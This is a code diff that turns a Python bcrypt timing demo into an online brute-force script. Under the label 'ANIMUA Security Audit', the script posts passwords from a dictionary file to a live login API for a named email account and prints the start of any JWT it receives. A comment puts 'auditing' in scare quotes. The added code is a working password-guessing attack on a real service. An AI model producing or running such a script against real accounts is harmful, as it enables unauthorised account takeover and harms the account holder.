@@ -1,29 +1,50 @@
-import bcrypt
+import requests
 import time
 
-# 1. This is a sample hash from your database (Cost Factor 10)
-# In your demo, you can replace this with a real hash from your Firestore
-stored_hash = b"$2b$10$5Rjs2zUogAN5kzQcbqKDMeZstDCnQPeIMXLYeZu5FcKR3Ef.TQUyO"
+# --- CONFIGURATION ---
+# Use your live Render API link
+login_url = "https://animua.onrender.com/api/auth/login"
+target_email = "yanapangan@gmail.com"  # The account you are "auditing"
 
-# 2. The "Dictionary" - common passwords an attacker would try
-password_list = ["123456", "password", "admin123", "animua2026", "secretpassword", "Hannah123456789"]
+# Load the password dictionary
+try:
+    with open("passwords.txt", "r") as file:
+        passwords = file.read().splitlines()
+except FileNotFoundError:
+    print("Error: passwords.txt not found!")
+    passwords = []
 
-def run_audit():
-    print("--- ANIMUA Security Audit: Bcrypt Brute-Force Test ---")
-    print(f"Target Hash: {stored_hash.decode()}\n")
+print(f"--- ANIMUA Security Audit: Brute Force Test ---")
+print(f"Target: {target_email}\n")
 
-    for guess in password_list:
-        start_time = time.time()
-        
-        # This function performs the actual 'work' of checking the password
-        is_match = bcrypt.checkpw(guess.encode('utf-8'), stored_hash)
-        
-        end_time = time.time()
-        duration = end_time - start_time
-        
-        print(f"Testing: '{guess}'")
-        print(f"Result: {'MATCH FOUND!' if is_match else 'Invalid'}")
-        print(f"Time taken: {duration:.4f} seconds\n")
+for password in passwords:
+    # Prepare the JSON payload your Express server expects
+    payload = {
+        "email": target_email,
+        "password": password
+    }
 
-if __name__ == "__main__":
-    run_audit()
+    start = time.time()
+    
+    try:
+        # Send the POST request to the API
+        response = requests.post(login_url, json=payload, timeout=10)
+        end = time.time()
+        elapsed = round(end - start, 2)
+
+        print(f"Testing: {password}")
+        print(f"Status: {response.status_code}") # 401 = Unauthorized, 200 = Success
+        print(f"Latency: {elapsed}s")
+        print("-" * 30)
+
+        # Success detection for your JWT response
+        if response.status_code == 200:
+            print(f"\n[!] ALERT: Weak Password Found: {password}")
+            print(f"JWT Token Received: {response.json().get('token')[:20]}...")
+            break
+            
+    except Exception as e:
+        print(f"Connection Error: {e}")
+        break
+
+print("\nAudit Complete.")
